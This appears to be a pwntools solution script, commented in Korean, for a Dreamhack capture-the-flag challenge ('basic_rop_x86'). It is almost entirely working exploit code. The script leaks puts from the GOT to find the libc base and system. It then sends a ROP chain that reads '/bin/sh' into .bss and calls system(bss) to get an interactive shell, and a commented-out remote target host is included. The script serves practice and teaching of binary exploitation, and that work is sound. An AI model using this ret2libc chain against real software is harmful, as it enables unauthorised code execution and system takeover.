
from pwn import *
context.log_level='debug' # 입출력 디버깅

# local exploit
p = process('./basic_rop_x86')
libc = ELF('/lib/i386-linux-gnu/libc.so.6') # 'ldd basic_rop_x86' 로 확인

# remote exploit
#p = remote('host3.dreamhack.games', [port])
#libc = ELF('./libc.so.6')

e = ELF('./basic_rop_x86')

# bss 영역 주소 얻기
bss = e.bss()

# 필요한 가젯 주소
pr_gadget = 0x0804868b
pppr_gadget = 0x08048689

# puts(puts@got); 호출 
puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
payload = b'A'*0x48
payload += p32(puts_plt)
payload += p32(pr_gadget)
payload += p32(puts_got)
payload += p32(e.sym['main']) # 다시 main 함수로 RET

# puts@got에서 libc offset을 이용해서 다른 함수 주소 얻기
p.sendline(payload)
p.recvuntil(b'A'*0x40)
puts = u32(p.recvn(4))
libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
print('[+] puts :', hex(puts))
print('[+] libc_base :', hex(libc_base))
print('[+] system :', hex(system))

# exploit payload
payload = b'A'*0x48

# read(0, bss, 4)
payload += p32(read_plt)
payload += p32(pppr_gadget)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

# system(bss)
payload += p32(system)
payload += b'BBBB'
payload += p32(bss)

p.sendline(payload)
p.recvuntil(b'A'*0x40)

# read 함수 인자 넘기기
p.send(b'/bin/sh\x00')

p.interactive()
